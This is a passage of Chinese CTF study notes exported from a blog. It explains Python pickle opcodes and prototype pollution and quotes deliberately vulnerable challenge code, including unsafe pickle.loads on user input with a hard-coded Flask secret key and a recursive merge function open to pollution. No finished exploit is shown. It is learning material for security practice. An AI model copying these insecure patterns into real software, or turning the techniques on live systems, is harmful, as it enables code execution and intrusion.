class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$var</span>)?(<span class="keyword">int</span>)<span class="variable">$val</span>:<span class="variable">$val</span>;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_opt</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$my</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_connect</span>(<span class="variable">$my</span>[<span class="string">&#x27;host&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;dbname&#x27;</span>], <span class="variable">$my</span>[<span class="string">&#x27;port&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;connect success&quot;</span>;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;show databases;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;connect fail&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql刷题笔记</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Pickle反序列化</title>
    <url>/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>Learnd From: <a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p>
<h3 id="什么是Pickle？"><a href="#什么是Pickle？" class="headerlink" title="什么是Pickle？"></a>什么是Pickle？</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">pickle是Python中一个能够序列化和反序列化对象的模块。和其他语言类似，Python也提供了序列化和反序列化这一功能，其中一个实现模块就是pickle。在Python中，*“Pickling”* 是将 Python 对象及其所拥有的层次结构转化为一个**二进制字节流**的过程，也就是我们常说的序列化，而 *“unpickling”* 是相反的操作，会将字节流转化回一个对象层次结构。</span><br><span class="line"></span><br><span class="line">当然在Python 中并不止pickle一个模块能够进行这一操作，更原始的序列化模块如`marshal`，同样能够完成序列化的任务，不过两者的侧重点并不相同，`marshal`存在主要是为了支持 Python 的`.pyc`文件。现在开发时一般首选pickle。</span><br><span class="line"></span><br><span class="line">pickle实际上可以看作一种**独立的语言**，通过对`opcode`的编写可以进行Python代码执行、覆盖变量等操作。直接编写的`opcode`灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</span><br><span class="line"></span><br><span class="line">既然opcode能够执行Python代码，那自然就免不了安全问题。以下是Python在pickle文档中的警告。</span><br></pre></td></tr></table></figure>

<h3 id="常用opcode"><a href="#常用opcode" class="headerlink" title="常用opcode"></a>常用opcode</h3><p>在Python的pickle.py中，我们能够找到所有的opcode及其解释，常用的opcode如下，这里我们以V0版本为例</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">描述</th>
<th align="left">具体写法</th>
<th align="left">栈上的变化</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">c</td>
<td align="left">获取一个全局对象或import一个模块</td>
<td align="left">c[module]\n[instance]\n</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="left">o</td>
<td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td align="left">o</td>
<td align="center">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td align="left">i</td>
<td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td align="left">i[module]\n[callable]\n</td>
<td align="center">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td align="left">N</td>
<td align="left">实例化一个None</td>
<td align="left">N</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="left">S</td>
<td align="left">实例化一个字符串对象</td>
<td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="left">V</td>
<td align="left">实例化一个UNICODE字符串对象</td>
<td align="left">Vxxx\n</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="left">I</td>
<td align="left">实例化一个int对象</td>
<td align="left">Ixxx\n</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="left">F</td>
<td align="left">实例化一个float对象</td>
<td align="left">Fx.x\n</td>
<td align="center">获得的对象入栈</td>
</tr>
<tr>
<td align="left">R</td>
<td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td align="left">R</td>
<td align="center">函数和参数出栈，函数的返回值入栈</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td align="left">.</td>
<td align="center">无</td>
</tr>
<tr>
<td align="left">(</td>
<td align="left">向栈中压入一个MARK标记</td>
<td align="left">(</td>
<td align="center">MARK标记入栈</td>
</tr>
<tr>
<td align="left">t</td>
<td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td align="left">t</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td align="left">)</td>
<td align="left">向栈中直接压入一个空元组</td>
<td align="left">)</td>
<td align="center">空元组入栈</td>
</tr>
<tr>
<td align="left">l</td>
<td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td align="left">l</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td align="left">]</td>
<td align="left">向栈中直接压入一个空列表</td>
<td align="left">]</td>
<td align="center">空列表入栈</td>
</tr>
<tr>
<td align="left">d</td>
<td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td align="left">d</td>
<td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td align="left">}</td>
<td align="left">向栈中直接压入一个空字典</td>
<td align="left">}</td>
<td align="center">空字典入栈</td>
</tr>
<tr>
<td align="left">p</td>
<td align="left">将栈顶对象储存至memo_n</td>
<td align="left">pn\n</td>
<td align="center">无</td>
</tr>
<tr>
<td align="left">g</td>
<td align="left">将memo_n的对象压栈</td>
<td align="left">gn\n</td>
<td align="center">对象被压栈</td>
</tr>
<tr>
<td align="left">0</td>
<td align="left">丢弃栈顶对象</td>
<td align="left">0</td>
<td align="center">栈顶对象被丢弃</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td align="left">b</td>
<td align="center">栈上第一个元素出栈</td>
</tr>
<tr>
<td align="left">s</td>
<td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td align="left">s</td>
<td align="center">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
</tr>
<tr>
<td align="left">u</td>
<td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td align="left">u</td>
<td align="center">MARK标记以及被组合的数据出栈，字典被更新</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">将栈的第一个元素append到第二个元素(列表)中</td>
<td align="left">a</td>
<td align="center">栈顶元素出栈，第二个元素（列表）被更新</td>
</tr>
<tr>
<td align="left">e</td>
<td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td align="left">e</td>
<td align="center">MARK标记以及被组合的数据出栈，列表被更新</td>
</tr>
</tbody></table>
<h1 id="ISCTF2024【新闻系统】"><a href="#ISCTF2024【新闻系统】" class="headerlink" title="ISCTF2024【新闻系统】"></a>ISCTF2024【新闻系统】</h1><p>前面就是session 伪造不多说</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">源码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;W3l1com_isCTF&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">News</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, title, content</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.title = title</span><br><span class="line">        <span class="variable language_">self</span>.content = content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;news(name=<span class="subst">&#123;self.title&#125;</span>, words=<span class="subst">&#123;self.content&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NewsList</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.news_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_news</span>(<span class="params">self, title, content</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        news = News(title,content)</span><br><span class="line">        <span class="variable language_">self</span>.news_list.append(news)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">export_news</span>(<span class="params">self, news_title</span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">        news = <span class="variable language_">self</span>.get_news(news_title)</span><br><span class="line">        <span class="keyword">if</span> news <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.news_list.remove(news)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;删除成功&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_news</span>(<span class="params">self, serialized_news</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            news_data = base64.b64decode(serialized_news)</span><br><span class="line">            black_list = [<span class="string">&#x27;create_news&#x27;</span>,<span class="string">&#x27;export_news&#x27;</span>,<span class="string">&#x27;add_news&#x27;</span>,<span class="string">&#x27;get_news&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">str</span>(news_data):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            news = pickle.loads(news_data) <span class="comment">#使用 pickle.loads 将解码后的数据反序列化成 Python 对象</span></span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(news,News):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable language_">self</span>.news_list:</span><br><span class="line">                    <span class="keyword">if</span> i.title == news.title:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="variable language_">self</span>.news_list.append(news)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_news</span>(<span class="params">self, news_title</span>) -&gt; News | <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> news <span class="keyword">in</span> <span class="variable language_">self</span>.news_list:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(news.title) == news_title:</span><br><span class="line">                <span class="keyword">return</span> news</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newslist = NewsList()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;test111&#x27;</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>] = password</span><br><span class="line">            session[<span class="string">&#x27;status&#x27;</span>] = <span class="string">&#x27;user&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/news&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;login_error&#x27;</span>] = <span class="literal">True</span>               </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news = newslist.news_list</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;news.html&quot;</span>,news = news)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    news = newslist.news_list</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;admin.html&quot;</span>,news = news)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)   </span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    newslist.create_news(title,content)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/export&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">export_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    news_title = request.form[<span class="string">&quot;title&quot;</span>]</span><br><span class="line">    result = newslist.export_news(news_title)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>: result&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;news not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/add&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)    </span><br><span class="line">    serialized_news = request.form[<span class="string">&quot;serialized_news&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> newslist.add_news(serialized_news):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Failed to add news&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>伪造进入&#x2F;admin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">news_data = base64.b64decode(serialized_news)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serialized_news = request.form[<span class="string">&quot;serialized_news&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> newslist.add_news(serialized_news):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里可以看到add路由可以进行反序列化</p>
<p>参考了 <a href="https://xz.aliyun.com/t/16227?time__1311=GuD=PRxGrh8D/WNiQGkDuQrKj8DmE+bD#toc-7">https://xz.aliyun.com/t/16227?time__1311=GuD%3DPRxGrh8D%2FWNiQGkDuQrKj8DmE%2BbD#toc-7</a></p>
<p>自己暂时还不会构造 然后 可以得到flag</p>
]]></content>
      <categories>
        <category>unserialize</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Python原型链污染</title>
    <url>/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<p>leran from :<a href="https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p>
<h1 id="Python原型链污染"><a href="#Python原型链污染" class="headerlink" title="Python原型链污染"></a>Python原型链污染</h1><p>这个知识点应用的范围比较小，仅当题目中出现<code>utils</code>的<code>merge</code>或<code>Pydash</code>模块中的<code>set</code>和<code>set_with</code>函数才会用上</p>
<p>首先经典回顾一下python的类与继承：</p>
<ul>
<li>在Python中，定义类是通过<code>class</code>关键字，<code>class</code>后面紧接着是类名，紧接着是<code>(object)</code>，表示该类是从哪个类继承下来的，所有类的本源都是object类</li>
<li>可以自由地给一个实例变量绑定属性，像js</li>
<li>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的<code>__init__</code>方法，在创建实例的时候，就把类内置的属性绑上</li>
<li>注意到<code>__init__</code>方法的第一个参数永远是<code>self</code>，表示创建的实例本身，因此，在<code>__init__</code>方法内部，就可以把各种属性绑定到<code>self</code>，因为<code>self</code>就指向创建的实例本身。</li>
<li>当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到</li>
<li>判断一个变量是否是某个类型可以用<code>isinstance()</code>判断。</li>
</ul>
<p>在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。</p>
<h2 id="DASCTF-2023-0X401七月暑期挑战赛-EzFlask"><a href="#DASCTF-2023-0X401七月暑期挑战赛-EzFlask" class="headerlink" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask"></a>[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)<span class="comment">#用于创建一个 Flask 应用实例</span></span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())<span class="comment">#设置 Flask 应用的密钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment">#遍历 src，递归合并数据到 dst，支持字典合并和对象属性动态更新。</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#@app.route 是一个装饰器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:<span class="comment">#检查请求中是否有数据</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#使用 try...except 捕获所有可能的异常，确保程序不会因为意外错误而崩溃</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):<span class="comment">#假定是一个自定义的函数，用于验证请求数据的合法性</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)<span class="comment">#将请求中的原始数据（字节流）解析为 Python 字典,如果解析失败,返回 &quot;Register Failed&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)<span class="comment">#将 data 中的键值对合并到用户实例 User 中</span></span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span 